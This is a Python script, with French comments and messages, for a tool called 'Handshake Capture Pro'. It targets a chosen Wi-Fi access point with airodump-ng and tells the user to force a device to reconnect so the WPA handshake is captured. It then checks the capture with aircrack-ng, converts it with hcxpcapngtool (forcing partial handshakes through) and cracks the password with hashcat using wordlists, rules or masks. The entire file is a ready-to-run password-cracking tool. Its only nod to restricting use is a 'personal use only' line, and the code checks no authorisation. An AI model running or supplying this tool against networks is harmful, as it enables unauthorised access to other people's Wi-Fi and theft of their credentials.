#!/usr/bin/env python3
"""
Handshake Capture Pro - Version finale
Capture + Vérification + Cracking hashcat avec fallback --all
Usage personnel uniquement
"""
import re
import subprocess
import time
import os
import glob
from datetime import datetime
from colorama import init, Fore, Style
init(autoreset=True)

class HandshakeCapture:
    def __init__(self, interface_mon, data_dir="data"):
        self.interface_mon = interface_mon
        self.data_dir = data_dir
        os.makedirs(data_dir, exist_ok=True)
        self.capture_process = None
        self.cap_file = None

    def _set_channel(self, channel):
        """Force l'interface sur le canal cible"""
        if not channel:
            return False
        try:
            channel = str(int(channel))
            subprocess.run(['iwconfig', self.interface_mon, 'channel', channel],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            subprocess.run(['iw', 'dev', self.interface_mon, 'set', 'channel', channel],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            print(f"{Fore.GREEN}[✓] Canal fixé sur {channel}")
            return True
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Échec canal : {e}")
            return False

    def capture(self, bssid, channel, essid, timeout=60):
        """Capture ciblée du handshake"""
        essid_clean = re.sub(r'[^\w\-_]', '_', essid)[:32]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.cap_file = os.path.join(self.data_dir, f"handshake_{essid_clean}_{timestamp}.cap")

        print(f"{Fore.CYAN}[*] Lancement capture handshake...")
        print(f"    ESSID : {Fore.GREEN}{essid}")
        print(f"    BSSID : {Fore.YELLOW}{bssid}")
        print(f"    Canal : {Fore.MAGENTA}{channel}")
        print(f"    Fichier : {Fore.CYAN}{self.cap_file}")

        self._set_channel(channel)

        cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '-c', str(channel),
            '--write', self.cap_file[:-4],
            '--output-format', 'pcap',
            self.interface_mon
        ]

        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Fore.CYAN}[*] Capture en cours... ({timeout}s)")
            print(f"{Fore.YELLOW}[!] Déconnectez/reconnectez un appareil pour forcer le handshake")

            for i in range(timeout, 0, -5):
                print(f"\r{Fore.CYAN}[*] Temps restant : {i:3d}s", end="", flush=True)
                time.sleep(5)

            print(f"\n{Fore.CYAN}[*] Arrêt de la capture...")
            self.capture_process.terminate()
            self.capture_process.wait(timeout=10)

            pattern = self.cap_file[:-4] + "*.cap"
            matches = glob.glob(pattern)
            if matches:
                final_cap = matches[0]
                if final_cap != self.cap_file:
                    os.rename(final_cap, self.cap_file)
                size_kb = os.path.getsize(self.cap_file) / 1024
                print(f"{Fore.GREEN}[✓] Capture terminée → {size_kb:.1f} KB")
                return True, self.cap_file
            else:
                print(f"{Fore.RED}[✗] Aucun fichier .cap généré")
                return False, None

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrompue par l'utilisateur")
            if self.capture_process:
                self.capture_process.terminate()
            return False, None
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur capture : {e}")
            return False, None

    def verify_handshake(self, cap_file):
        """Vérifie avec aircrack-ng (plus tolérant)"""
        if not os.path.exists(cap_file):
            return False, "Fichier manquant"

        print(f"{Fore.CYAN}[*] Vérification handshake avec aircrack-ng...")
        try:
            result = subprocess.run(['aircrack-ng', '-w', '/dev/null', cap_file],
                                    capture_output=True, text=True, timeout=40)

            output = result.stdout.lower()
            if "1 handshake" in output or "handshake" in output:
                lines = result.stdout.splitlines()
                for line in lines:
                    if "handshake" in line.lower():
                        print(f"{Fore.GREEN}[✓] {line.strip()}")
                print(f"{Fore.GREEN}[✓] Handshake détecté par aircrack-ng !")
                return True, "Valide (aircrack-ng)"
            else:
                print(f"{Fore.YELLOW}[!] Aucun handshake détecté")
                return False, "Aucun handshake"
        except Exception as e:
            return False, f"Erreur : {e}"

    def crack_with_hashcat(self, cap_file, wordlist=None, mask=None, rules=None):
        """Conversion intelligente + cracking hashcat"""
        if not os.path.exists(cap_file):
            print(f"{Fore.RED}[✗] Fichier .cap introuvable")
            return False

        hc22000_file = cap_file.replace(".cap", ".hc22000")

        print(f"{Fore.CYAN}[*] Conversion .cap → .hc22000 pour hashcat...")

        try:
            # Essai 1 : conversion normale
            result = subprocess.run(['hcxpcapngtool', '-o', hc22000_file, cap_file],
                                    capture_output=True, text=True, timeout=30)

            if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 100:
                print(f"{Fore.GREEN}[✓] Conversion réussie (standard)")
            else:
                print(f"{Fore.YELLOW}[!] Standard échoué → tentative avec --all")
                # Essai 2 : forcer avec --all (récupère les handshakes faibles/partiels)
                subprocess.run(['hcxpcapngtool', '--all', '-o', hc22000_file, cap_file],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)

                if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 50:
                    print(f"{Fore.GREEN}[✓] Conversion réussie avec --all !")
                else:
                    print(f"{Fore.RED}[✗] Impossible de générer un .hc22000 valide")
                    print(f"{Fore.YELLOW}[!] Le handshake est trop incomplet ou corrompu")
                    return False

        except FileNotFoundError:
            print(f"{Fore.RED}[✗] hcxpcapngtool non installé (sudo apt install hcxtools)")
            return False
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur conversion : {e}")
            return False

        print(f"{Fore.GREEN}[✓] Fichier hashcat prêt : {os.path.basename(hc22000_file)}")

        # Construction commande hashcat
        cmd = ['hashcat', '-m', '22000', hc22000_file, '-w', '3', '--force']

        if wordlist and os.path.exists(wordlist):
            cmd.extend(['-a', '0', wordlist])
            if rules and os.path.exists(rules):
                cmd.extend(['-r', rules])
            mode = f"Wordlist ({os.path.basename(wordlist)})"
        elif mask:
            cmd.extend(['-a', '3', mask])
            mode = f"Masque : {mask}"
        else:
            cmd.append('--show')
            mode = "Affichage des mots de passe déjà crackés"

        print(f"{Fore.CYAN}[*] Lancement hashcat → {mode}")
        print(f"{Fore.YELLOW}[!] Appuyez sur q + Entrée pour arrêter")

        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       text=True, bufsize=1, universal_newlines=True)

            cracked = False
            for line in process.stdout:
                line = line.strip()
                if line:
                    print(line)
                    if "Cracked" in line or "Recovered" in line:
                        cracked = True

            process.wait()

            if cracked:
                print(f"\n{Fore.GREEN}{'═' * 60}")
                print(f"{Fore.GREEN} ✓ MOT DE PASSE CRAQUÉ AVEC SUCCÈS ! ✓")
                print(f"{Fore.GREEN}{'═' * 60}")
            else:
                print(f"\n{Fore.YELLOW}[!] Pas trouvé avec ces paramètres")

            return cracked

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Cracking interrompu")
            process.terminate()
            return False
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur hashcat : {e}")
            return False